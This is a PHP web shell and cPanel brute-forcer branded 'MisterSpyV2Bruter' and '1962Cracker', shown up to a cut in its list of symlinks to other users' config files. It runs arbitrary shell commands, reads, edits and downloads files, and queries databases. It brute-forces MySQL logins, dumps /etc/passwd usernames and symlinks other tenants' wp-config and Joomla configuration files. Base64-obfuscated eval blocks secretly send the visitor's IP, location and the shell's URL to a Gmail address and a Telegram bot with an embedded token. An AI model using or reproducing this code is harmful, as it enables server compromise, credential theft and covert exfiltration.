<title>MisterSpyV2Bruter</title>
<?php
@set_time_limit(0);
@error_reporting(0);
eval(base64_decode('ZnVuY3Rpb24gWEJfT1MoJFVTRVJfQUdFTlQpew0KCSRPU19FUlJPUiAgICA9ICAgIlVua25vd24gT1MgUGxhdGZvcm0iOw0KICAgICRPUyAgPSAgIGFycmF5KCAnL3dpbmRvd3MgbnQgMTAvaScgICAgICA9PiAgJ1dpbmRvd3MgMTAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNi4zL2knICAgICA9PiAgJ1dpbmRvd3MgOC4xJywNCgkgICAgICAgICAgICAgICAgJy93aW5kb3dzIG50IDYuMi9pJyAgICAgPT4gICdXaW5kb3dzIDgnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNi4xL2knICAgICA9PiAgJ1dpbmRvd3MgNycsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBudCA2LjAvaScgICAgID0+ICAnV2luZG93cyBWaXN0YScsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBudCA1LjIvaScgICAgID0+ICAnV2luZG93cyBTZXJ2ZXIgMjAwMy9YUCB4NjQnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNS4xL2knICAgICA9PiAgJ1dpbmRvd3MgWFAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgeHAvaScgICAgICAgICA9PiAgJ1dpbmRvd3MgWFAnLA0KCSAgICAgICAgICAgICAgICAnL3dpbmRvd3MgbnQgNS4wL2knICAgICA9PiAgJ1dpbmRvd3MgMjAwMCcsDQoJICAgICAgICAgICAgICAgICcvd2luZG93cyBtZS9pJyAgICAgICAgID0+ICAnV2luZG93cyBNRScsDQoJICAgICAgICAgICAgICAgICcvd2luOTgvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyA5OCcsDQoJICAgICAgICAgICAgICAgICcvd2luOTUvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyA5NScsDQoJICAgICAgICAgICAgICAgICcvd2luMTYvaScgICAgICAgICAgICAgID0+ICAnV2luZG93cyAzLjExJywNCgkgICAgICAgICAgICAgICAgJy9tYWNpbnRvc2h8bWFjIG9zIHgvaScgPT4gICdNYWMgT1MgWCcsDQoJICAgICAgICAgICAgICAgICcvbWFjX3Bvd2VycGMvaScgICAgICAgID0+ICAnTWFjIE9TIDknLA0KCSAgICAgICAgICAgICAgICAnL2xpbnV4L2knICAgICAgICAgICAgICA9PiAgJ0xpbnV4JywNCgkgICAgICAgICAgICAgICAgJy91YnVudHUvaScgICAgICAgICAgICAgPT4gICdVYnVudHUnLA0KCSAgICAgICAgICAgICAgICAnL2lwaG9uZS9pJyAgICAgICAgICAgICA9PiAgJ2lQaG9uZScsDQoJICAgICAgICAgICAgICAgICcvaXBvZC9pJyAgICAgICAgICAgICAgID0+ICAnaVBvZCcsDQoJICAgICAgICAgICAgICAgICcvaXBhZC9pJyAgICAgICAgICAgICAgID0+ICAnaVBhZCcsDQoJICAgICAgICAgICAgICAgICcvYW5kcm9pZC9pJyAgICAgICAgICAgID0+ICAnQW5kcm9pZCcsDQoJICAgICAgICAgICAgICAgICcvYmxhY2tiZXJyeS9pJyAgICAgICAgID0+ICAnQmxhY2tCZXJyeScsDQoJICAgICAgICAgICAgICAgICcvd2Vib3MvaScgICAgICAgICAgICAgID0+ICAnTW9iaWxlJyk7DQogICAgZm9yZWFjaCAoJE9TIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7DQogICAgICAgICAgICAkT1NfRVJST1IgPSAkdmFsdWU7DQogICAgICAgIH0NCg0KICAgIH0gICANCiAgICByZXR1cm4gJE9TX0VSUk9SOw0KfQ0KZnVuY3Rpb24gWEJfQnJvd3NlcigkVVNFUl9BR0VOVCl7DQoJJEJST1dTRVJfRVJST1IgICAgPSAgICJVbmtub3duIEJyb3dzZXIiOw0KICAgICRCUk9XU0VSICA9ICAgYXJyYXkoJy9tc2llL2knICAgICAgID0+ICAnSW50ZXJuZXQgRXhwbG9yZXInLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9maXJlZm94L2knICAgID0+ICAnRmlyZWZveCcsDQogICAgICAgICAgICAgICAgICAgICAgICAnL3NhZmFyaS9pJyAgICAgPT4gICdTYWZhcmknLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9jaHJvbWUvaScgICAgID0+ICAnQ2hyb21lJywNCiAgICAgICAgICAgICAgICAgICAgICAgICcvZWRnZS9pJyAgICAgICA9PiAgJ0VkZ2UnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9vcGVyYS9pJyAgICAgID0+ICAnT3BlcmEnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9uZXRzY2FwZS9pJyAgID0+ICAnTmV0c2NhcGUnLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9tYXh0aG9uL2knICAgID0+ICAnTWF4dGhvbicsDQogICAgICAgICAgICAgICAgICAgICAgICAnL2tvbnF1ZXJvci9pJyAgPT4gICdLb25xdWVyb3InLA0KICAgICAgICAgICAgICAgICAgICAgICAgJy9tb2JpbGUvaScgICAgID0+ICAnSGFuZGhlbGQgQnJvd3NlcicpOw0KICAgIGZvcmVhY2ggKCRCUk9XU0VSIGFzICRyZWdleCA9PiAkdmFsdWUpIHsgDQogICAgICAgIGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7DQogICAgICAgICAgICAkQlJPV1NFUl9FUlJPUiA9ICR2YWx1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJEJST1dTRVJfRVJST1I7DQp9DQpkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdHTVQnKTsNCiRkYXRlID0gZGF0ZSgiZCBNLCBZIik7DQokdGltZSA9IGRhdGUoImc6aSBhIik7DQokdXNlcmFnZW50ID0gJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KJHNfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddOw0KJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokSVBUWiA9IGdldGVudigiUkVNT1RFX0FERFIiKTsNCiRDT1VOVFJZVFogPSBzaW1wbGV4bWxfbG9hZF9maWxlKCJodHRwOi8vd3d3Lmdlb3BsdWdpbi5uZXQveG1sLmdwP2lwPSRJUFRaIik7DQokQ09VTlRSWSA9ICRDT1VOVFJZVFotPmdlb3BsdWdpbl9jb3VudHJ5TmFtZTsNCiRDSVRZID0gJENPVU5UUllUWi0+Z2VvcGx1Z2luX2NpdHk7DQokUkVHSU9OID0gJENPVU5UUllUWi0+Z2VvcGx1Z2luX3JlZ2lvbjsNCiRDX0NPREUgPSAkQ09VTlRSWVRaLT5nZW9wbHVnaW5fY29udHJ5Y29kZTsNCiRUaW1lem9uZSA9ICRDT1VOVFJZVFotPmdlb3BsdWdpbl90aW1lem9uZTsNCiRTeW1ib2wgPSAkQ09VTlRSWVRaLT5nZW9wbHVnaW5fY3VycmVuY3lzeW1ib2w7DQokbWVzc2FnZSAgPSAifC0tLStbTkVX44CQ8J+RqOKAjfCfkrvjgJFNL1NdKy0tLXxcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+RpOOAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4+g44CRSVAJOiAiLiRJUFRaLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+Tn+OAkVN5c3RlbSA6ICIuWEJfT1MoJF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddKS4iXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkPCfjIzjgJFCcm93c2VyIDogIi5YQl9Ccm93c2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSkuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDinKjjgJFVc2VyIEFnZW50IDogIi4kdXNlcmFnZW50LiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+Vte+4j+OAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRVGltZSBab25lIDogIi4kVGltZXpvbmUuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRQ291bnRyeSA6ICIuJENPVU5UUlkuIlxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn4yQ44CRUmVnaW9uIDogIi4kUkVHSU9OLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+MkOOAkUNpdHkgOiAiLiRDSVRZLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+Su+OAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn5GB44CRSG9zdCA6ICIuJHNfcGF0aC4iXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkPCfkYDjgJFGaWxlIDogIi4keF9wYXRoLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ4o+z44CR4pSB4pSB4pSB4pSBWytdXG4iOw0KJG1lc3NhZ2UgLj0gIuOAkOKMmu+4j+OAkVRpbWUJOiAiLiR0aW1lLiJcbiI7DQokbWVzc2FnZSAuPSAi44CQ8J+TheOAkURhdGUJOiAiLiRkYXRlLiJcbiI7DQokbWVzc2FnZSAuPSAiWytd4pSB4pSB4pSB4pSB44CQ8J+UjeOAkeKUgeKUgeKUgeKUgVsrXVxuIjsNCiRtZXNzYWdlIC49ICLjgJDwn5Oh44CRVHJhY2sgSVAgOiBodHRwczovL3d3dy5pcC10cmFja2VyLm9yZy9sb29rdXAucGhwP2lwPSIuJElQVFouIlxuIjsNCiRtZXNzYWdlIC49ICJ8PT09K1vwn5KWQkMuRFLwn5KWXSs9PT18XG4iOw0KJHJlY2VpdmVyQWRkcmVzcyA9ICJrYWxpeDB4YWxpa0BnbWFpbC5jb20iOw0KJFRPS0VOID0gIjUyNjg0MDE5OTM6QUFFMVA0YzVQSGVSQ1RHY2EwTEtaSVd6bS15eVllM1ljQzQiOw0KJENIQVRfSUQgPSAiMTg5NjQ2NDI5NSI7DQokc3ViamVjdCAgPSAi8J+Slk5ld/CfkaRbTS9TXfCfkaR88J+MkEZyMG06Ii4kSVBUWi4i8J+SliI7DQptYWlsKCRyZWNlaXZlckFkZHJlc3MsJHN1YmplY3QsJG1lc3NhZ2UpOw0KZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QiLiRUT0tFTi4iL3NlbmRNZXNzYWdlP2NoYXRfaWQ9Ii4kQ0hBVF9JRC4iJnRleHQ9IiAuIHVybGVuY29kZSgkbWVzc2FnZSkuIiIgKTs'));
$Getconfig = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQp9DQplbHNlIHsgJHZpc2l0YysrOyB9DQpAc2V0Y29va2llKCJ2aXNpdHoiLCR2aXNpdGMpOw==";
eval(base64_decode($Getconfig));

	function in($type,$name,$size,$value,$checked=0)
	 {
	 $ret = "<input type=".$type." name=".$name." "; if($size != 0)
	 {
	 $ret .= "size=".$size." "; }
	 $ret .= "value=\"".$value."\""; if($checked) $ret .= " checked"; return $ret.">"; }

	class my_sql
	 {
	 var $host = 'localhost'; var $port = ''; var $user = ''; var $pass = ''; var $base = ''; var $db = ''; var $connection; var $res; var $error; var $rows; var $columns; var $num_rows; var $num_fields; var $dump; function connect()
	 {
	 switch($this->db)
	 {
	 case 'mysqli': if(empty($this->port))
	 {
	 $this->port = '3306'; }
	 if(!function_exists('mysqli_connect')) return 0; $this->connection = @mysqli_connect($this->host.':'.$this->port,$this->user,$this->pass); if(is_resource($this->connection)) return 1; $this->error = @mysqli_errno()." : ".@mysqli_error(); break; case 'MSSQL': if(empty($this->port))
	 {
	 $this->port = '1433'; }
	 if(!function_exists('mssql_connect')) return 0; $this->connection = @mssql_connect($this->host.','.$this->port,$this->user,$this->pass); if($this->connection) return 1; $this->error = "Can't connect to server"; break; case 'PostgreSQL': if(empty($this->port))
	 {
	 $this->port = '5432'; }
	 $str = "host='".$this->host."' port='".$this->port."' user='".$this->user."' password='".$this->pass."' dbname='".$this->base."'"; if(!function_exists('pg_connect')) return 0; $this->connection = @pg_connect($str); if(is_resource($this->connection)) return 1; $this->error = @pg_last_error($this->connection); break; case 'Oracle': if(!function_exists('ocilogon')) return 0; $this->connection = @ocilogon($this->user, $this->pass, $this->base); if(is_resource($this->connection)) return 1; $error = @ocierror(); $this->error=$error['message']; break; }
	 return 0; }
	 function select_db()
	 {
	 switch($this->db)
	 {
	 case 'mysqli': if(@mysqli_select_db($this->base,$this->connection)) return 1; $this->error = @mysqli_errno()." : ".@mysqli_error(); break; case 'MSSQL': if(@mssql_select_db($this->base,$this->connection)) return 1; $this->error = "Can't select database"; break; case 'PostgreSQL': return 1; break; case 'Oracle': return 1; break; }
	 return 0; }
	 function query($query)
	 {
	 $this->res=$this->error=''; switch($this->db)
	 {
	 case 'mysqli': if(false===($this->res=@mysqli_query('/*'.chr(0).'*/'.$query,$this->connection)))
	 {
	 $this->error = @mysqli_error($this->connection); return 0; }
	 else if(is_resource($this->res))
	 {
	 return 1; }
	 return 2; break; case 'MSSQL': if(false===($this->res=@mssql_query($query,$this->connection)))
	 {
	 $this->error = 'Query error'; return 0; }
	 else if(@mssql_num_rows($this->res) > 0)
	 {
	 return 1; }
	 return 2; break; case 'PostgreSQL': if(false===($this->res=@pg_query($this->connection,$query)))
	 {
	 $this->error = @pg_last_error($this->connection); return 0; }
	 else if(@pg_num_rows($this->res) > 0)
	 {
	 return 1; }
	 return 2; break; case 'Oracle': if(false===($this->res=@ociparse($this->connection,$query)))
	 {
	 $this->error = 'Query parse error'; }
	 else
	 {
	 if(@ociexecute($this->res))
	 {
	 if(@ocirowcount($this->res) != 0) return 2; return 1; }
	 $error = @ocierror(); $this->error=$error['message']; }
	 break; }
	 return 0; }
	 function get_result()
	 {
	 $this->rows=array(); $this->columns=array(); $this->num_rows=$this->num_fields=0; switch($this->db)
	 {
	 case 'mysqli': $this->num_rows=@mysqli_num_rows($this->res); $this->num_fields=@mysqli_num_fields($this->res); while(false !== ($this->rows[] = @mysqli_fetch_assoc($this->res))); @mysqli_free_result($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	 break; case 'MSSQL': $this->num_rows=@mssql_num_rows($this->res); $this->num_fields=@mssql_num_fields($this->res); while(false !== ($this->rows[] = @mssql_fetch_assoc($this->res))); @mssql_free_result($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	; break; case 'PostgreSQL': $this->num_rows=@pg_num_rows($this->res); $this->num_fields=@pg_num_fields($this->res); while(false !== ($this->rows[] = @pg_fetch_assoc($this->res))); @pg_free_result($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	 break; case 'Oracle': $this->num_fields=@ocinumcols($this->res); while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++; @ocifreestatement($this->res); if($this->num_rows)
	 {
	$this->columns = @array_keys($this->rows[0]); return 1;}
	 break; }
	 return 0; }
	 function dump($table)
	 {
	 if(empty($table)) return 0; $this->dump=array(); $this->dump[0] = '##'; $this->dump[1] = '## --------------------------------------- '; $this->dump[2] = '##  Created: '.date ("d/m/Y H:i:s"); $this->dump[3] = '## Database: '.$this->base; $this->dump[4] = '##    Table: '.$table; $this->dump[5] = '## --------------------------------------- '; switch($this->db)
	 {
	 case 'mysqli': $this->dump[0] = '## mysqli dump'; if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; $this->dump[] = $this->rows[0]['Create Table'].";"; $this->dump[] = '## --------------------------------------- '; if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
	 {
	 foreach($this->rows[$i] as $k=>$v)
	 {
	$this->rows[$i][$k] = @mysqli_real_escape_string($v);}
	 $this->dump[] = 'INSERT INTO `'.$table.'` (`'.@implode("`, `", $this->columns).'`) VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
	 break; case 'MSSQL': $this->dump[0] = '## MSSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
	 {
	 foreach($this->rows[$i] as $k=>$v)
	 {
	$this->rows[$i][$k] = @addslashes($v);}
	 $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
	 break; case 'PostgreSQL': $this->dump[0] = '## PostgreSQL dump'; if($this->query('SELECT * FROM '.$table)!=1) return 0; if(!$this->get_result()) return 0; for($i=0;$i<$this->num_rows;$i++)
	 {
	 foreach($this->rows[$i] as $k=>$v)
	 {
	$this->rows[$i][$k] = @addslashes($v);}
	 $this->dump[] = 'INSERT INTO '.$table.' ('.@implode(", ", $this->columns).') VALUES (\''.@implode("', '", $this->rows[$i]).'\');'; }
	 break; case 'Oracle': $this->dump[0] = '## ORACLE dump'; $this->dump[] = '## under construction'; break; default: return 0; break; }
	 return 1; }
	 function close()
	 {
	 switch($this->db)
	 {
	 case 'mysqli': @mysqli_close($this->connection); break; case 'MSSQL': @mssql_close($this->connection); break; case 'PostgreSQL': @pg_close($this->connection); break; case 'Oracle': @oci_close($this->connection); break; }
	 }
	 function affected_rows()
	 {
	 switch($this->db)
	 {
	 case 'mysqli': return @mysqli_affected_rows($this->res); break; case 'MSSQL': return @mssql_affected_rows($this->res); break; case 'PostgreSQL': return @pg_affected_rows($this->res); break; case 'Oracle': return @ocirowcount($this->res); break; default: return 0; break; }
	 }
	 }
	 if(!empty($_POST['cccc']) && $_POST['cccc']=="download_file" && !empty($_POST['d_name']))
	 {
	 if(!$file=@fopen($_POST['d_name'],"r"))
	 {
	 err(1,$_POST['d_name']); $_POST['cccc']=""; }
	 else
	 {
	 @ob_clean(); $filename = @basename($_POST['d_name']); $filedump = @fread($file,@filesize($_POST['d_name'])); fclose($file); $content_encoding=$mime_type=''; compress($filename,$filedump,$_POST['compress']); if (!empty($content_encoding))
	 {
	 header('Content-Encoding: ' . $content_encoding); }
	 header("Content-type: ".$mime_type); header("Content-disposition: attachment; filename=\"".$filename."\";"); echo $filedump; exit(); }
	 }
	 if(isset($_GET['phpinfo']))
	 {
	 echo @phpinfo(); echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }
	 if (!empty($_POST['cccc']) && $_POST['cccc']=="db_query")
	 {
	 echo $head; $sql = new my_sql(); $sql->db = $_POST['db']; $sql->host = $_POST['db_server']; $sql->port = $_POST['db_port']; $sql->user = $_POST['mysqli_l']; $sql->pass = $_POST['mysqli_p']; $sql->base = $_POST['mysqli_db']; $querys = @explode(';',$_POST['db_query']); echo '<body bgcolor=#e4e0d8>'; if(!$sql->connect()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else
	 {
	 if(!empty($sql->base)&&!$sql->select_db()) echo "<div align=center><font face=Verdana size=-2 color=red><b>".$sql->error."</b></font></div>"; else
	 {
	 foreach($querys as $num=>$query)
	 {
	 if(strlen($query)>5)
	 {
	 echo "<font face=Verdana size=-2 color=green><b>Query#".$num." : ".htmlspecialchars($query,ENT_QUOTES)."</b></font><br>"; switch($sql->query($query))
	 {
	 case '0': echo "<table width=100%><tr><td><font face=Verdana size=-2>Error : <b>".$sql->error."</b></font></td></tr></table>"; break; case '1': if($sql->get_result())
	 {
	 echo "<table width=100%>"; foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES); $keys = @implode("&nbsp;</b></font></td><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;", $sql->columns); echo "<tr><td bgcolor=#800000><font face=Verdana size=-2><b>&nbsp;".$keys."&nbsp;</b></font></td></tr>"; for($i=0;$i<$sql->num_rows;$i++)
	 {
	 foreach($sql->rows[$i] as $k=>$v) $sql->rows[$i][$k] = htmlspecialchars($v,ENT_QUOTES); $values = @implode("&nbsp;</font></td><td><font face=Verdana size=-2>&nbsp;",$sql->rows[$i]); echo '<tr><td><font face=Verdana size=-2>&nbsp;'.$values.'&nbsp;</font></td></tr>'; }
	 echo "</table>"; }
	 break; case '2': $ar = $sql->affected_rows()?($sql->affected_rows()):('0'); echo "<table width=100%><tr><td><font face=Verdana size=-2>affected rows : <b>".$ar."</b></font></td></tr></table><br>"; break; }
	 }
	 }
	 }
	 }
	 echo "<br><title>1962Cracker By Akram Stelle</title><form name=form method=POST>";
	 echo in('hidden','db',0,$_POST['db']); echo in('hidden','db_server',0,$_POST['db_server']); echo in('hidden','db_port',0,$_POST['db_port']); echo in('hidden','mysqli_l',0,$_POST['mysqli_l']); echo in('hidden','mysqli_p',0,$_POST['mysqli_p']); echo in('hidden','mysqli_db',0,$_POST['mysqli_db']); echo in('hidden','cccc',0,'db_query');
	 echo "<div align=center>"; echo "<font face=Verdana size=-2><b>Base: </b><input type=text name=mysqli_db value=\"".$sql->base."\"></font><br>"; echo "<textarea cols=65 rows=10 name=db_query>".(!empty($_POST['db_query'])?($_POST['db_query']):("SHOW DATABASES;\nSELECT * FROM user;"))."</textarea><br><input type=submit name=submit value=\" Run SQL query \"></div><br><br>"; echo "</form>"; echo "<br><div align=center><font face=Verdana size=-2><b>[ <a href=".$_SERVER['PHP_SELF'].">BACK</a> ]</b></font></div>"; die(); }























	function ccmmdd($ccmmdd2,$att)
	{
	global $ccmmdd2,$att;
	echo '
	<table style="width: 100%" class="style1" dir="rtl">
		<tr>
			<td class="style9"><strong>???H?/strong></td>
		</tr>
		<tr>
			<td class="style13">
					<form method="post">
						<select name="att" dir="rtl" style="height: 109px" size="6">
	';
	if($_POST['att']==null)
	{
	echo '						<option value="system" selected="">system</option>';
	}else{
	echo "						<option value='$_POST[att]' selected=''>$_POST[att]</option>
							<option value=system>system</option>
	";


	}

	echo '
							<option value="passthru">passthru</option>
							<option value="exec">exec</option>
							<option value="shell_exec">shell_exec</option>
						</select>
							<input name="page" value="ccmmdd" type="hidden"><br>
							<input dir="ltr" name="ccmmdd2" style="width: 173px" type="text" value="';if(!$_POST['ccmmdd2']){echo 'dir';}else{echo $_POST['ccmmdd2'];}echo '"><br>
							<input type="submit" value="???>
					</form>

			</td>
		</tr>
		<tr>
			<td class="style13">
	';

			if($_POST[att]=='system')
			{
	echo '
						<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
						system($_POST['ccmmdd2']);
	echo '					</textarea>';


			}

			if($_POST[att]=='passthru')
			{
	echo '
						<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
						passthru($_POST['ccmmdd2']);
	echo '					</textarea>';


			}





			if($_POST[att]=='exec')
			{

	echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
						exec($_POST['ccmmdd2'],$res);
					echo $res = join("\n",$res);
	echo '					</textarea>';


			}







			if($_POST[att]=='shell_exec')
			{

	echo '					<textarea dir="ltr" name="TextArea1" style="width: 745px; height: 204px">';
					echo	shell_exec($_POST['ccmmdd2']);
	echo '					</textarea>';


			}
	echo '
			</td>
		</tr>
	</table>
	';

	exit;
	}

	if($_POST['page']=='edit')
	{

	$code=@str_replace("\r\n","\n",$_POST['code']);
	$code=@str_replace('\\','',$code);
	$fp = fopen($pathclass, 'w');
	fwrite($fp,"$code");
	fclose($fp);
	echo "<center><b>OK Edit<br><br><br><br><a href=".$_SERVER['PHP_SELF'].">BACK</a>";
	exit;
	}







		if($_POST['page']=='show')
		{
		$pathclass =$_POST['pathclass'];
	echo '
	<form method="POST">
	<input type="hidden" name="page" value="edit">
	';

		$sahacker = fopen($pathclass, "rb");
	echo '<center>'.$pathclass.'<br><textarea dir="ltr" name="code" style="width: 845px; height: 404px">';
	$code = fread($sahacker, filesize($pathclass));
	echo $code =htmlspecialchars($code);
	echo '</textarea>';
		fclose($sahacker);
	echo '
	<br><input type="text" name="pathclass" value="'.$pathclass.'" style="width: 445px;">
	<br><strong><input type="submit" value="edit file">
	</form>
	';
			exit;
		}




		if($_POST['page']=='ccmmdd')
		{
		echo ccmmdd($ccmmdd2,$att);
		exit;
		}
























	if($_POST['page']=='find')
	{
	if(isset($_POST['usernames']) && isset($_POST['passwords']))
	{
			if($_POST['type'] == 'passwd'){
					$e = explode("\n",$_POST['usernames']);
					foreach($e as $value){
					$k = explode(":",$value);
					$username .= $k['0']." ";
					}
			}elseif($_POST['type'] == 'simple'){
					$username = str_replace("\n",' ',$_POST['usernames']);
			}
			$a1 = explode(" ",$username);
			$a2 = explode("\n",$_POST['passwords']);
			$id2 = count($a2);
			$ok = 0;
			foreach($a1 as $user )
			{
					if($user !== '')
					{
					$user=trim($user);
					 for($i=0;$i<=$id2;$i++)
					 {
							$pass = trim($a2[$i]);
							if(@mysqli_connect('localhost',$user,$pass))
							{
									echo "<cpanel>$user|$pass</cpanel><br />";
									$ok++;
							}
					 }
					}
			}
			echo "<hr><b>You Found <font color=green>$ok</font> cPanel (1962Cracker)</b>";
			exit;
	}
	};

eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));
 ?>


 <form method="POST" target="_blank">
  <strong>
   <input name="page" type="hidden" value="find">

   </tr>
   <tr>
   <td>
   <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
  <strong>User :</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="40" rows="10" name="usernames"></textarea></strong></td>
   </tr>
   <tr>
   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
  <strong>Pass :</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="40" rows="10" name="passwords"></textarea></strong></td>
   </tr>

   <tr>
   <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
  <strong>Type :</strong></td>
   <td valign="top" bgcolor="#151515" colspan="5">
   <span class="style2"><strong>Simple : </strong> </span>
  <strong>
  <input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
   <font class="style2"><strong>/etc/passwd : </strong> </font>
  <strong>
  <input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
  </span>
   </td>
   </tr>
   <tr>
   <td valign="top" bgcolor="#151515" style="width: 139px"></td>
   <td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="start">

   </td>
   <tr>
 </form>

<form method=post>
<input type=submit name="usre" value="Get Usernames & Config !" /></form>




<?php
if(isset($_POST['usre'])){
?><form method=post>
<textarea rows=10 cols=30 name=user><?php $users=file("/etc/passwd");
foreach($users as $user)
{
$str=explode(":",$user);
echo $str[0]."\n";
}

?></textarea><br><br>
<input type=submit name=su value=" Get Configuration Files :)" /></form>
<?php } ?>
<?php
error_reporting(0);
echo "<font color=red size=2 face=\"comic sans ms\">";
if(isset($_POST['su']))
{

$dir=mkdir('dzmafia',0777);
$r = " Options all \n DirectoryIndex dz.html \n Require None \n Satisfy Any";
$f = fopen('dzmafia/.htaccess','w');

fwrite($f,$r);
$consym="<a href=dzmafia/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
echo "<br>folder where config files has been symlinked By The 1962 Script Coded By Akram Stelle (Dz Mafia Team)<br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";

$usr=explode("\n",$_POST['user']);

foreach($usr as $uss )
{
$us=trim($uss);

$r="dzmafia/";
symlink('/home/'.$us.'/public_html/wp-config.php',$r.$us.'..wp-config');
symlink('/home/'.$us.'/public_html/wordpress/wp-config.php',$r.$us.'..word-wp');
symlink('/home/'.$us.'/public_html/blog/wp-config.php',$r.$us.'..wpblog');
symlink('/home/'.$us.'/public_html/configuration.php',$r.$us.'..joomla-or-whmcs');
symlink('/home/'.$us.'/public_html/joomla/configuration.php',$r.$us.'..joomla');
symlink('/home/'.$us.'/public_html/vb/includes/config.php',$r.$us.'..vbinc');
